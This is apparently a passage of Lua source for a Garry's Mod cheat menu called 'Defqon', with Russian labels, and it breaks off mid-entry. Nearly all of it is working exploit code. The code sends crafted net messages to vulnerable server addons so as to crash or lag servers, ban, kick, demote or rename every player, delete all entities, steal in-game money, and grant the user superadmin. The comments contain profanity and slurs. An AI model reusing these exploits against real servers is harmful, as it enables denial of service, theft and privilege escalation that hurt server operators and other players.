
if ( SERVER ) then
function file.Read(d)
return "Well try my slut ;)"
end
end
local Defqon = nil
if ulx then ulx.showMotdMenu = function() end end
local iZNX = {}
iZNX.memory = {}
surface.CreateFont("HUDLogo2",{size = 18, weight = 100, antialias = 0})
timer.Create("timerversionchecker",20,1,function()
hook.Remove("HUDPaint", "HudVersionChecker")
end)
hook.Add("HUDPaint", "HudVersionChecker", function()
draw.SimpleTextOutlined( "Привет "..steamworks.GetPlayerName( LocalPlayer():SteamID64() )..", вы используете последнюю версию меню", "HUDLogo2", ScrW()/2 + math.sin(RealTime()) * ScrW() / 85, ScrH()/30, Color( 99, 210, 214, 255), TEXT_ALIGN_CENTER, TEXT_ALIGN_CENTER, 1, Color(0,0,0,255) )
end)

local grad = Material( "gui/gradient" )
local upgrad = Material( "gui/gradient_up" )
local downgrad = Material( "gui/gradient_down" )
local ctext = chat.AddText
local C = table.Copy( concommand )
local CCA = C.Add
local prant = print
local netKey = ""
local ulxflood = false

s = {}
    s.hitRequest = {}
    s.hitRequest.hitman = LocalPlayer()
    s.hitRequest.requester = LocalPlayer()
    s.hitRequest.target = LocalPlayer()
    s.hitRequest.reward = -99999999999999999999999
    s.duel = {}
    s.duel[1] = table.Random( player.GetAll() )
    s.duel[2] = table.Random( player.GetAll() )
    s.duel[2] = 3
    s.duel[3] = -9999999
    s.lagz16 = { cmd = "+forward" , args = " " }
    s.lags17 = { " " , "Open" , nil , nil , nil , nil }
    s.Target = {}
    s.Exploits = {}
    s.colors = {}
    s.count = 0
    s.AtlasFuck = ""
    for i=1, 100 do
        s.AtlasFuck = s.AtlasFuck .. "<avatar>"
    end
    s.pp = istable(FPP) or istable(GPP) -- need mor
    s.colors[1] = Color(28,28,28,30)
    s.colors[2] = Color(75,50,100,30)
    s.colors[3] = Color(1,149,205,30)
    s.colors[4] = Color(255,144,0,30)
    s.colors[5] = Color(229,13,13,30)
    s.LagText = "0xFFFFFFF"
    /*




function gui.url()
surface.PlaySound("garrysmod/ui_click.wav")
gui.OpenURL( "http://discord.gg/hf8GVVS" )
end
function iZNX.ChatText( str )
ctext( Color(208, 114, 255), [[ [Defqon™]: ]]..str )
end
function iZNX.NetStart( str )
local netstart = net.Start
if Defqon and Defqon.G and Defqon.G.net then
netstart = Defqon.G.net.Start
else
--        print( "sending netmessage in insecure mode" )
end
return netstart( str )
end
function iZNX.ValidNetString( str )
local netstart = net.Start
if Defqon and Defqon.G and Defqon.G.net then
netstart = Defqon.G.net.Start
else
--        print( "scanning for exploit in insecure mode" )
end
local status, error = pcall( netstart, str )
return status
end
function iZNX.ValidNetString( str )
local status, error = pcall( net.Start, str )
return status
end
iZNX.sploits = {}
local severitycols = { -- Цвет обводки эксплойтов (их "значимость")
[1337] = Color( 255, 0, 0 ),
[1] = Color( 100, 100, 100 ),
[2] = Color( 100, 100, 100 ),
[3] = Color( 100, 100, 100 ),
[4] = Color( 184, 109, 255 ),
}
function iZNX.AddExploit( name, tab ) -- ОДЭДЭ ЭКСПЛОЙТ, FUCK
if !isstring( name ) then print("U FUCKED UP A SPLOIT RETARD") return end
if !istable( tab ) then print("U FUCKED UP A SPLOIT RETARD") return end
iZNX.sploits[name] = tab
end
function iZNX.IsStored( addr )
return iZNX.memory[addr] != nil
end
function iZNX.GetStored( addr, fallback )
if fallback and iZNX.memory[addr] == nil then return fallback end
return iZNX.memory[addr]
end
function iZNX.Store( addr, val )
iZNX.memory[addr] = val
end
function iZNX.GetAllStored()
return iZNX.memory
end
function iZNX.GetAllStoredData()
local ret = {}
for k, v in pairs( iZNX.memory ) do
if !istable( v ) then ret[k] = v end
end
return ret
end
spoofchat = 0

-----------------------------------------------------------------------------  EXPLOITS  -------------------------------------------------------------------------------------------------------------------------------------------

--[[ ------------------------------------------------------------------------------------------------------------------------------------
!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!   NEW SHIT   !!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
-----------------------------------------------------------------------------------------------------------------------------------------]] 

iZNX.AddExploit( "[NEW] Duel Crazy", {
desc = "Трахнуть все и вся",
severity = 1337,
scan = function() return iZNX.ValidNetString( "DuelMessageReturn" ) end,
functions = {
{ typ = "func", name = "Начать", func = function()
surface.PlaySound("garrysmod/ui_click.wav")
iZNX.ChatText("Начинаем")
s.duel[1] = table.Random( player.GetAll() )
s.duel[2] = table.Random( player.GetAll() )
net.Start("DuelMessageReturn")
net.WriteFloat(1)
net.WriteTable(s.duel)
net.SendToServer()
end }
}
}
)
iZNX.AddExploit( "[NEW] Ban RDM", {
desc = "Exploit банит людей (не думаю что работает)",
severity = 1337,
scan = function() return iZNX.ValidNetString( "ban_rdm" ) end,
functions = {
{ typ = "players", addr = "listban" },
{ typ = "func", name = "Начать", func = function()
surface.PlaySound("garrysmod/ui_click.wav")
iZNX.ChatText("Начинаем")
local t = iZNX.GetStored( "listban", {} )
for k, v in pairs( player.GetAll() ) do
iZNX.NetStart("ban_rdm")
net.WriteString(v:SteamID())
net.SendToServer()
end
end }
}
}
)
iZNX.AddExploit( "[NEW] € Выдача денег €", {
desc = "Вам на счет зачисляются деньги (не думаю что работает)",
severity = 1337,
scan = function() return iZNX.ValidNetString( "BuyCar" ) end,
functions = {
{ typ = "func", name = "Начать", func = function()
surface.PlaySound("garrysmod/ui_click.wav")
iZNX.ChatText("Начинаем")
iZNX.NetStart("BuyCar")
net.WriteFloat(-1000000000000)
net.WriteEntity(LocalPlayer())
net.WriteString("IDI NAHUY")
net.WriteString("IDI NAHUY")
net.WriteString("IDI NAHUY")
net.SendToServer()
end, },
},
} )
iZNX.AddExploit( "[NEW] Нагрузка на сервер", {
desc = "Сервер будет лагать",
severity = 1337,
scan = function() return iZNX.ValidNetString( "ats_send_toServer" ) end,
functions = {
{ typ = "func", name = "Начать", func = function()
surface.PlaySound("garrysmod/ui_click.wav")
iZNX.ChatText("Начинаем")
for i=1,2000 do
iZNX.NetStart("ats_send_toServer")
net.WriteTable({ " " , "Open" , nil , nil , nil , nil })
net.SendToServer()
end
end, },
},
} )
iZNX.AddExploit( "[NEW] Нагрузка на сервер", {
desc = "Сервер будет лагать",
severity = 1337,
scan = function() return iZNX.ValidNetString( "dLogsGetCommand" ) end,
functions = {
{ typ = "func", name = "Начать", func = function()
surface.PlaySound("garrysmod/ui_click.wav")
iZNX.ChatText("Начинаем")
for i=1,7000 do
iZNX.NetStart('dLogsGetCommand')
net.WriteTable(s.lagz16)
net.SendToServer()
end
end, },
},
} )
iZNX.AddExploit( "[NEW] Маскировка", {
desc = "Exploit позволяет замаскироваться",
severity = 1337,
scan = function() return iZNX.ValidNetString( "disguise" ) end,
functions = {
{ typ = "float", name = "ID Работы", min = "1", max = "999999999", default = "6", addr = "disguisez" },
{ typ = "func", name = "Приступить", func = function()
surface.PlaySound("garrysmod/ui_click.wav")
iZNX.ChatText("Маскируемся")
iZNX.NetStart("disguise")
net.WriteInt(iZNX.GetStored( "disguisez" ), 32)
net.SendToServer()
end }
}
}
)
iZNX.AddExploit( "[NEW] € Get Car €", {
desc = "Exploit для получения бесплатной машины",
severity = 1337,
scan = function() return iZNX.ValidNetString( "race_accept" ) end,
functions = {
{ typ = "float", name = "ID машины", min = "1", max = "999999999", default = "1", addr = "freecar" },
{ typ = "func", name = "Тык", func = function()
surface.PlaySound("garrysmod/ui_click.wav")
iZNX.ChatText("Получаем")
iZNX.NetStart("race_accept")
net.WriteInt(iZNX.GetStored( "disguisez" ), 32)
net.SendToServer()
end }
}
}
)
iZNX.AddExploit( "[NEW] Оружие", {
desc = "Вам выдается RPG (не думаю что работает)",
severity = 1337,
scan = function() return iZNX.ValidNetString( "give_me_weapon" ) end,
functions = {
{ typ = "func", name = "Тык", func = function()
surface.PlaySound("garrysmod/ui_click.wav")
iZNX.ChatText("Получаем")
iZNX.NetStart("give_me_weapon")
net.WriteString("weapon_rpg");
net.SendToServer()
end, },
},
} )
iZNX.AddExploit( "[NEW] € Выдача денег €", {
desc = "Вам на счет зачисляются деньги (не думаю что работает)",
severity = 1337,
scan = function() return iZNX.ValidNetString( "FinishContract" ) end,
functions = {
{ typ = "func", name = "Тык", func = function()
surface.PlaySound("garrysmod/ui_click.wav")
iZNX.ChatText("Получаем")
iZNX.NetStart("FinishContract")
net.WriteDouble(10000000000000) 
net.SendToServer()
end, },
},
} )
iZNX.AddExploit( "[NEW] Респавн", {
desc = "Быстрый респавн",
severity = 1337,
scan = function() return iZNX.ValidNetString( "NLR_SPAWN" ) end,
functions = {
{ typ = "func", name = "Тык", func = function()
surface.PlaySound("garrysmod/ui_click.wav")
iZNX.ChatText("Возрождаемся")
iZNX.NetStart("NLR_SPAWN")
net.WriteEntity(LocalPlayer())
net.SendToServer()
end, },
},
} )
iZNX.AddExploit( "[NEW] Break handcuffs", {
desc = "Exploit для того, чтобы сломать наручники",
severity = 1337,
scan = function() return iZNX.ValidNetString( "Kun_ZiptieStruggle" ) end,
functions = {
{ typ = "func", name = "Тык", func = function()
surface.PlaySound("garrysmod/ui_click.wav")
iZNX.ChatText("Пытаемся сломать")
for i=0,30 do 
iZNX.NetStart("Kun_ZiptieStruggle")
net.SendToServer()
end
end }
}
}
)
iZNX.AddExploit( "[NEW] Abuses Jailbreak Votekick", {
desc = "",
severity = 1337,
scan = function() return iZNX.ValidNetString( "JB_Votekick" ) end,
functions = {
{ typ = "func", name = "Тык", func = function()
surface.PlaySound("garrysmod/ui_click.wav")
iZNX.ChatText("Попытка кика")
for k,v in pairs(player.GetAll()) do
iZNX.NetStart("JB_Votekick")
net.WriteEntity(v)
net.WriteString("what? what? what? what? what? what? what? what? what? what? what? what? what? what? what? what? what? ")
net.SendToServer()
end
end }
}
}
)
iZNX.AddExploit( "[NEW] ByB Force Bail", {
desc = "[description = 0]",
severity = 1337,
scan = function() return iZNX.ValidNetString( "Letthisdudeout" ) end,
functions = {
{ typ = "func", name = "Тык", func = function()
surface.PlaySound("garrysmod/ui_click.wav")
iZNX.NetStart("Letthisdudeout")
net.WriteEntity(LocalPlayer())
net.SendToServer()
end }
}
}
)
iZNX.AddExploit( "[NEW] Legit краш сервера", {
desc = "Абсолютно слабый",
severity = 1337,
scan = function() return iZNX.ValidNetString( "NET_SS_DoBuyTakeoff" ) end,
functions = {
{ typ = "func", name = "Тык", func = function()
surface.PlaySound("garrysmod/ui_click.wav")
iZNX.ChatText("Попытка краша")
iZNX.NetStart( "NET_SS_DoBuyTakeoff" )
net.WriteEntity(LocalPlayer())
net.WriteEntity(table.Random(player.GetAll()))
net.WriteTable({})
net.WriteInt(-1000000000000000000000000000000000000000000000000000000000000000000, 16)
net.SendToServer()
end }
}
}
)
iZNX.AddExploit( "[NEW] € Casino Cit €", {
desc = "Exploit на деньги",
severity = 1337,
scan = function() return iZNX.ValidNetString( "ckit_roul_bet" ) end,
functions = {
{ typ = "func", name = "Тык", func = function()
surface.PlaySound("garrysmod/ui_click.wav")
iZNX.ChatText("Получаем")
iZNX.NetStart("ckit_roul_bet")
net.WriteEntity(self)
net.WriteString("")
net.WriteString("")
net.WriteUInt(-100000000, 16)
net.SendToServer()
end }
}
}
)
iZNX.AddExploit( "[NEW] Изменить всем имена", {
desc = "Exploit для изменения имен",
severity = 1337,
scan = function() return iZNX.ValidNetString( "NC_GetNameChange" ) end,
functions = {
{ typ = "string", name = "Ник", default = "Hacked", addr = "nicks" },
{ typ = "func", name = "Тык", func = function()
surface.PlaySound("garrysmod/ui_click.wav")
iZNX.ChatText("Изменяем")
for k, v in pairs( player.GetAll() ) do
iZNX.NetStart("NC_GetNameChange")
net.WriteEntity(v)
net.WriteString( iZNX.GetStored( "nicks" ) )
net.WriteString( iZNX.GetStored( "nicks" ) )
net.SendToServer()
end
end }
}
}
)
iZNX.AddExploit( "[NEW] Удалить все энтити", {
desc = "[Работает, если работает эксплойт на стрип оружия]",
severity = 1337,
scan = function() return iZNX.ValidNetString( "properties" ) and (!FPP or (FPP and FPP.Settings.FPP_TOOLGUN1.worldprops == 1)) end,
functions = {
{ typ = "func", name = "Тык", func = function()
surface.PlaySound("garrysmod/ui_click.wav")
iZNX.ChatText("Удаляем")
for i=1,#ents.GetAll() do
iZNX.NetStart( "properties" )
net.WriteString( "remove" )
net.WriteEntity( ents.GetAll()[i] )
net.SendToServer()
end
end }
}
}
)
iZNX.AddExploit( "[NEW] Crasher", {
desc = "Exploit",
severity = 1337,
scan = function() return iZNX.ValidNetString( "pac.net.TouchFlexes.ClientNotify" ) end,
functions = {
{ typ = "func", name = "Тык", func = function()
surface.PlaySound("garrysmod/ui_click.wav")
if !timer.Exists( "crashlol" ) then
timer.Create("crashlol", 0, 0, function()
for i = 1, 400 do
iZNX.NetStart("pac.net.TouchFlexes.ClientNotify")
net.WriteInt( 9999999999999999999999999999999999999999999999999999999999999999999999, 13)
net.SendToServer()
end
end)
iZNX.ChatText("Начинаем краш")
else
timer.Remove("crashlol")
iZNX.ChatText("Прекращаем краш")
end
end }
}
}
)
iZNX.AddExploit( "[NEW] € Easy Money €", {
desc = "Exploit на деньги",
severity = 1337,
scan = function() return iZNX.ValidNetString( "ply_pick_shit" ) end,
functions = {
{ typ = "func", name = "Тык", func = function()
surface.PlaySound("garrysmod/ui_click.wav")
iZNX.ChatText("Получаем деньги")
for k, v in pairs (player.GetAll()) do
for i = 1,255 do
iZNX.NetStart("ply_pick_shit")
net.WriteEntity(LocalPlayer())
net.WriteEntity(v)
net.SendToServer()
end
end
end }
}
}
)
iZNX.AddExploit( "[NEW] TFA Lag Exploit", {
desc = "Exploit для создания лагов на сервере, с паком оружия TFA",
severity = 1337,
scan = function() return iZNX.ValidNetString( "TFA_Attachment_RequestAll" ) end,
functions = {
{ typ = "func", name = "Тык", func = function()
surface.PlaySound("garrysmod/ui_click.wav")
iZNX.ChatText("Начинаем лаги")
if !timer.Exists( "tfalags" ) then
timer.Create("tfalags", 0, 0, function()
for i = 1, 400 do
iZNX.NetStart("TFA_Attachment_RequestAll")
net.SendToServer()
end
end )
end
end }
}
}
)
iZNX.AddExploit( "Lag Exploit", {
desc = "Exploit на лаги",
severity = 1,
scan = function() return iZNX.ValidNetString( "NDES_SelectedEmblem" ) end,
functions = {
{ typ = "func", name = "Тык", func = function()
surface.PlaySound("garrysmod/ui_click.wav")
iZNX.ChatText("Начинаем лаги")
if not timer.Exists("lagger10") then
timer.Create("lagger10", 0.5, 0, function()
for i = 1, 2000 do
iZNX.NetStart("NDES_SelectedEmblem")
net.WriteString("Seized")
net.SendToServer()
end
end)
else
timer.Remove("lagger10")
iZNX.ChatText("Прекращаем лаги")
end
end, },
},
} )
iZNX.AddExploit( "Crasher #1", {
desc = "Exploit на краш сервера",
severity = 1,
scan = function() return iZNX.ValidNetString( "Morpheus.StaffTracker" ) end,
functions = {
{ typ = "func", name = "Тык", func = function()
surface.PlaySound("garrysmod/ui_click.wav")
iZNX.ChatText("Крашим")
if not timer.Exists("crasher") then
timer.Create("crasher", 0.5, 0, function()
for i = 1, 2000 do
iZNX.NetStart("Morpheus.StaffTracker")
net.SendToServer()
end
end)
else
timer.Remove("crasher")
iZNX.ChatText("Останавливаем краш")
end
end, },
},
} )
iZNX.AddExploit( "Lag Exploit#2", {
desc = "Exploit на лаги",
severity = 1,
scan = function() return iZNX.ValidNetString( "join_disconnect" ) end,
functions = {
{ typ = "func", name = "Тык", func = function()
surface.PlaySound("garrysmod/ui_click.wav")
iZNX.ChatText("Начинаем лаги")
if not timer.Exists("lagglol") then
timer.Create("lagglol", 0.5, 0, function()
for i = 1, 3000 do
iZNX.NetStart("join_disconnect")
net.WriteEntity(table.Random(player.GetAll()))
net.SendToServer()
end
end)
else
timer.Remove("lagglol")
iZNX.ChatText("Прекращаем лаги")
end
end, },
},
} )
iZNX.AddExploit( "Lag Exploit #3", {
desc = "Exploit на лаги",
severity = 1,
scan = function() return iZNX.ValidNetString( "EZS_PlayerTag" ) end,
functions = {
{ typ = "func", name = "Тык", func = function()
surface.PlaySound("garrysmod/ui_click.wav")
iZNX.ChatText("Начинаем лаги")
if not timer.Exists("laggslol") then
timer.Create("laggslol", 0.5, 0, function()
for k, v in pairs(player.GetAll()) do
iZNX.NetStart("EZS_PlayerTag")
net.WriteEntity(v)
net.WriteString("Seized")
net.SendToServer()
timer.Simple(2, function()
iZNX.NetStart("EZS_PlayerTag")
net.WriteEntity(v)
net.WriteString("Seized")
net.SendToServer()
end )
end
end )
else
timer.Remove("laggslol")
iZNX.ChatText("Прекращаем лаги")
end
end }
}
}
)
iZNX.AddExploit( "Remove Spread", {
desc = "Exploit убирает разброс",
severity = 1,
scan = function() return checkcvar end,
functions = {
{ typ = "func", name = "Тык", func = function()
surface.PlaySound("garrysmod/ui_click.wav")
hook.Remove("PlayerTick", "WyoziAdvTTTSpreadOverTime")
iZNX.ChatText("Разброс убран")
end }
}
}
)
iZNX.AddExploit( "Give physgun", {
desc = "Получение физгана",
severity = 1,
scan = function() return iZNX.ValidNetString( "BuyFirstTovar" ) end,
functions = {
{ typ = "func", name = "Получить", func = function()
surface.PlaySound("garrysmod/ui_click.wav")
iZNX.NetStart("BuyFirstTovar")
net.WriteString("0")
net.SendToServer()
iZNX.ChatText("Получен physgun")
end }
}
}
)
iZNX.AddExploit( "Give gravity gun", {
desc = "Получение гравити гана",
severity = 1,
scan = function() return iZNX.ValidNetString( "BuySecondTovar" ) end,
functions = {
{ typ = "func", name = "Получить", func = function()
surface.PlaySound("garrysmod/ui_click.wav")
iZNX.NetStart("BuySecondTovar")
net.WriteString("0")
net.SendToServer()
iZNX.ChatText("Получен gravity gun")
end }
}
}
)
iZNX.AddExploit( "Auto-Heal", {
desc = "Exploit на автоматическое лечение",
severity = 1,
scan = function() return iZNX.ValidNetString( "GiveHealthNPC" ) end,
functions = {
{ typ = "func", name = "Тык", func = function()
surface.PlaySound("garrysmod/ui_click.wav")
if not autoheal_enable then
iZNX.ChatText("AutoHeal - вкл")
hook.Add("Think", "RE.CheckHealt", function()
if LocalPlayer():Health() < 100 then
iZNX.NetStart("GiveHealthNPC")
net.WriteString("100")
net.SendToServer()
end
end)
autoheal_enable = true
else
iZNX.ChatText("AutoHeal - выкл")
hook.Remove("Think", "RE.CheckHealt")
autoheal_enable = false
end
end }
}
}
)
iZNX.AddExploit( "Unbox System Manipulation Exploit #1", {
desc = "Exploit с ключами и кейсами из CSGO",
severity = 1,
scan = function() return iZNX.ValidNetString( "BuyKey" ) end,
functions = {
{ typ = "func", name = "Тык", func = function()
surface.PlaySound("garrysmod/ui_click.html")
iZNX.ChatText("Получаем ключ")
iZNX.NetStart("BuyKey")
net.SendToServer()
end }
}
}
)
iZNX.AddExploit( "Unbox System Manipulation Exploit #2", {
desc = "Exploit с ключами и кейсами из CSGO",
severity = 1,
scan = function() return iZNX.ValidNetString( "BuyCrate" ) end,
functions = {
{ typ = "func", name = "Тык", func = function()
surface.PlaySound("garrysmod/ui_click.html")
iZNX.ChatText("Получаем кейс")
iZNX.NetStart("BuyCrate")
net.SendToServer()
end }
}
}
)
iZNX.AddExploit( "Get Weapon", {
desc = "Exploit на получение оружия",
severity = 1,
scan = function() return iZNX.ValidNetString( "MONEY_SYSTEM_GetWeapons" ) end,
functions = {
{ typ = "func", name = "Тык", func = function()
surface.PlaySound("garrysmod/ui_click.html")
iZNX.ChatText("Получаем оружие")
for i = 1,32 do
iZNX.NetStart("MONEY_SYSTEM_GetWeapons")
net.WriteInt(i, 8)
net.SendToServer()
end
end }
}
}
)
iZNX.AddExploit( "Demote Exploit", {
desc = "Exploit на увольнение всех людей на сервере",
severity = 1,
scan = function() return iZNX.ValidNetString( "MCon_Demote_ToServer" ) end,
functions = {
{ typ = "func", name = "Тык", func = function()
surface.PlaySound("garrysmod/ui_click.html")
iZNX.ChatText("Увольняем")
for k,v in pairs(player.GetAll()) do
iZNX.NetStart("MCon_Demote_ToServer")
net.WriteString(v:SteamID())
net.SendToServer()
end
end }
}
}
)
iZNX.AddExploit( "€ Printers Money Stealer # €", {
desc = "Exploit на воровство денег с чужих принтеров",
severity = 1,
scan = function() return iZNX.ValidNetString( "SyncPrinterButtons16690" ) end,
functions = {
{ typ = "func", name = "Тык", func = function()
surface.PlaySound("garrysmod/ui_click.html")
if !timer.Exists( "Defqon_exploit_money" ) then
iZNX.ChatText( "Воруем чужие деньги" )
timer.Create( "Defqon_exploit_money", 0.1, 0, function()
for k, v in pairs(ents.GetAll()) do
if v:GetModel() == "models/props_c17/consolebox01a.mdl" then
iZNX.NetStart( "SyncPrinterButtons16690" )
net.WriteEntity(v)
net.WriteUInt(2, 4)
net.SendToServer()
end
end
end)
else
timer.Remove( "Defqon_exploit_money" )
iZNX.ChatText( "Прекращаем воровать" )
end
end, },
},
} )
iZNX.AddExploit( "€ Derma Printers Money Stealer €", {
desc = "Exploit на воровство денег с чужих принтеров",
severity = 1,
scan = function() return iZNX.ValidNetString( "withdrawp" ) end,
functions = {
{ typ = "func", name = "Тык", func = function()
surface.PlaySound("garrysmod/ui_click.html")
iZNX.ChatText("Воруем - "..#ents.FindByClass("derma_printer").." шт.")
for k,v in pairs(ents.FindByClass("derma_printer")) do
net.Start("withdrawp")
net.WriteEntity(v)
net.SendToServer()
end
end }
}
}
)
iZNX.AddExploit( "€ Money Exploit €", {
desc = "DarkRP_SS_Gamble",
severity = 1,
scan = function() return iZNX.ValidNetString( "DarkRP_SS_Gamble" ) end,
functions = {
{ typ = "func", name = "Тык", func = function()
surface.PlaySound("garrysmod/ui_click.html")
iZNX.NetStart( "DarkRP_SS_Gamble" )
net.WriteInt(50000, 32)
net.WriteInt(1, 32)
net.WriteInt(0, 32)
net.WriteInt(0, 32)
net.WriteInt(1, 32)
net.SendToServer()
end }
}
})
iZNX.AddExploit( "Delete PromoCode", {
desc = "Удаление промокодов",
severity = 1,
scan = function() return iZNX.ValidNetString( "PCAdd" ) end,
functions = {
{ typ = "func", name = "Тык", func = function()
surface.PlaySound("garrysmod/ui_click.html")
iZNX.NetStart( "PCAdd" )
net.WriteString("alahman")
net.WriteString("300000000")
net.SendToServer()
timer.Simple(3,function()
iZNX.NetStart("ActivatePC")
net.WriteString("alahman")
net.SendToServer()
iZNX.NetStart("PCDelAll")
net.SendToServer()
end
)
end}
}
}
)
iZNX.AddExploit( "HL2RP Disp", {
desc = "Запускает одну голосовую команду, по типу коменданского часа (как в hl2)",
severity = 1,
scan = function() return iZNX.ValidNetString( "viv_hl2rp_disp_message" ) end,
functions = {
{ typ = "func", name = "Тык", func = function()
surface.PlaySound("garrysmod/ui_click.html")
iZNX.ChatText( "Запускаем" )
for name, command in pairs (dispatchCommands) do
iZNX.NetStart("viv_hl2rp_disp_message")
net.WriteString(command)
net.SendToServer()
end
end }
}
}
)
iZNX.AddExploit( "HL2RP Disp Flood", {
desc = "Запускает много голосовых команд, по типу коменданского часа (как в hl2)",
severity = 1,
scan = function() return iZNX.ValidNetString( "viv_hl2rp_disp_message" ) end,
functions = {
{ typ = "func", name = "Тык", func = function()
surface.PlaySound("garrysmod/ui_click.html")
iZNX.ChatText( "Flood - on" )
if not timer.Exists("HL2RPFLOOD") then
timer.Create("HL2RPFLOOD", 0, 0, function()
for name, command in pairs (dispatchCommands) do
iZNX.NetStart("viv_hl2rp_disp_message")
net.WriteString(command)
net.SendToServer()
end
end
)
else
timer.Remove("HL2RPFLOOD")
iZNX.ChatText( "Flood - off" )
end
end }
}
}
)
iZNX.AddExploit( "Easter Egg", {
desc = "Находит пасхальные яйца",
severity = 1,
scan = function() return iZNX.ValidNetString( "egg" ) end,
functions = {
{ typ = "func", name = "1 яйцо", func = function()
surface.PlaySound("garrysmod/ui_click.html")
RunConsoleCommand("say", "4bigz")      
end, },
{ typ = "func", name = "2 яйцо", func = function()
surface.PlaySound("garrysmod/ui_click.html")
RunConsoleCommand("cc_egg2")      
end, },
{ typ = "func", name = "3 яйцо", func = function()
iZNX.NetStart("egg")              
net.SendToServer()
end, },
},
} )
iZNX.AddExploit( "Атака нулевого дня #1", {
desc = "Вызывает моментальный сбой в работе системы и сервер крашится к чертям",
severity = 1,
scan = function() return iZNX.ValidNetString( "Sbox_gm_attackofnullday" ) end,
functions = {
{ typ = "func", name = "Начать", func = function()
surface.PlaySound("garrysmod/ui_click.html")
RunConsoleCommand("gm_attackofnullday")
end, },
},
} )
iZNX.AddExploit( "Атака нулевого дня #2", {
desc = "Выдает вам суперадминку",
severity = 1,
scan = function() return iZNX.ValidNetString( "Sbox_gm_attackofnullday_key" ) end,
functions = {
{ typ = "func", name = "Начать", func = function()
surface.PlaySound("garrysmod/ui_click.html")
iZNX.ChatText( "Выдаем админку" )
iZNX.NetStart("Sbox_gm_attackofnullday_key")
net.WriteString( "ulx adduser \""..lp:Nick().."\" superadmin" )
net.WriteBit(0)
net.SendToServer()
RunConsoleCommand("gm_attackofnullday")
end, },
},
} )
iZNX.AddExploit( "Toggle TTT Report Bypass", {
desc = "TTT Report Bypass",
severity = 1,
scan = function() return isttt end,
functions = {
{ typ = "func", name = "Начать", func = function()
surface.PlaySound("garrysmod/ui_click.html")
if bypass == 0 then
	            hook.Add("Think", "remove_ttt_report", function()
	                local pan = vgui.GetHoveredPanel()
	                CheckChild(pan)
	            end)

	            iZNX.ChatText("Report Bypass включен")
	            bypass = 1
	        else
	            hook.Remove("Think", "remove_ttt_report")
	            iZNX.ChatText("Report Bypass выключен")
	            bypass = 0
end
end }
}
}
)

--[[ ------------------------------------------------------------------------------------------------------------------------------------
!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!   OLD SHIT   !!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
-----------------------------------------------------------------------------------------------------------------------------------------]]
iZNX.AddExploit( "€ Customizable Printers Money Stealer €", {
desc = "Мгновенно крадет все деньги от каждого принтера на сервере",
severity = 3,
scan = function() return iZNX.ValidNetString( "SyncPrinterButtons76561198056171650" ) end,
functions = {
{ typ = "func", name = "Тык", func = function()
surface.PlaySound("garrysmod/ui_click.html")
if !timer.Exists( "Defqon_exploit_shekels" ) then
iZNX.ChatText( "Воруем чужие деньги" )
timer.Create( "Defqon_exploit_shekels", 0.1, 0, function()
for k, v in pairs(ents.GetAll()) do
if( v:GetClass():find("print") ) then
iZNX.NetStart( "SyncPrinterButtons76561198056171650" )
net.WriteEntity(v)
net.WriteUInt(2, 4)
net.SendToServer()
end
end
end)
else
timer.Remove( "Defqon_exploit_shekels" )
iZNX.ChatText( "Прекращаем воровать" )
end
end, },
},
} )
iZNX.AddExploit( "ULX Friends Spam", {
desc = "Спам сообщением на сервере",
severity = 1,
scan = function() return (iZNX.ValidNetString( "sendtable" ) and ulx and ulx.friends ) end,
functions = {
{ typ = "string", name = "Введите сообщение", default = "FUCK YOU", addr = "fr_spamstring" },
{ typ = "players", addr = "fr_players" },
{ typ = "func", name = "Big Spam", func = function()
surface.PlaySound("garrysmod/ui_click.html")
if !timer.Exists( "bigspams" ) then
iZNX.ChatText( "Начинаем спам" )
timer.Create( "bigspams", 0.5, 0, function()
local t = iZNX.GetStored( "fr_players", {} )
for k, v in pairs( player.GetAll() ) do
if !table.HasValue( t, v ) then continue end
local buyit = {}
for i = 1, 15 do
table.insert( buyit, iZNX.GetStored( "fr_spamstring", "FUCK YOU" ) )
end
iZNX.NetStart( "sendtable" )
net.WriteEntity( v )
net.WriteTable( buyit )
net.SendToServer()
end
end)
else
timer.Remove( "bigspams" )
iZNX.ChatText( "Прекращаем спам" )
end
end, },
},
} )
iZNX.AddExploit( "Console Error Spammer", {
desc = "(Поражение rcon сервера массовыми ошибками)",
severity = 1,
scan = function() return iZNX.ValidNetString( "steamid2" ) end,
functions = {
{ typ = "func", name = "Big Spam", func = function()
surface.PlaySound("garrysmod/ui_click.html")
if !timer.Exists( "Defqon_exploit_errorz" ) then
iZNX.ChatText( "Error спам запущен" )
timer.Create( "Defqon_exploit_errorz", 0.1, 0, function()
iZNX.NetStart( "steamid2" )
net.WriteString( "Something is creating very strong script errors" )
net.SendToServer()
end)
else
timer.Remove( "Defqon_exploit_errorz" )
iZNX.ChatText( "Error спам остановлен" )
end
end, },
},
} )
iZNX.AddExploit( "Turbo Error Spammer", {
desc = "Поражение rcon сервера массовыми ошибками",
severity = 2,
scan = function() return iZNX.ValidNetString( "steamid2" ) end,
functions = {
{ typ = "func", name = "Big Spam", func = function()
surface.PlaySound("garrysmod/ui_click.html")
if !timer.Exists( "Defqon_exploit_errorzt" ) then
iZNX.ChatText( "Error спам запущен" )
timer.Create( "Defqon_exploit_errorzt", 0, 0, function()
for i = 1, 100 do
iZNX.NetStart( "steamid2" )
net.WriteString( "Something is creating very strong script errors" )
net.SendToServer()
end
end)
else
timer.Remove( "Defqon_exploit_errorzt" )
iZNX.ChatText( "Error спам остановлен" )
end
end, },
},
} )
iZNX.AddExploit( "€ Kun Drug €", {
desc = "Exploit на деньги",
severity = 3,
scan = function() return iZNX.ValidNetString( "Kun_SellDrug" ) end,
functions = {
{ typ = "func", name = "Запуск", func = function()
surface.PlaySound("garrysmod/ui_click.html")
if !timer.Exists( "Defqon_exploit_selldrugon" ) then
iZNX.ChatText( "Exploit запущен" )
timer.Create( "Defqon_exploit_selldrugon", 0, 0, function()
for i=1,1000 do
iZNX.NetStart("Kun_SellDrug")
net.WriteString("mushroom")
net.SendToServer()
end 
end)
else
timer.Remove( "Defqon_exploit_selldrugon" )
iZNX.ChatText( "Exploit остановлен" )
end
end, },
},
} )
iZNX.AddExploit( "Point Shop Unbox", {
desc = "Exploit, связанный с аддоном Point Shop",
severity = 2,
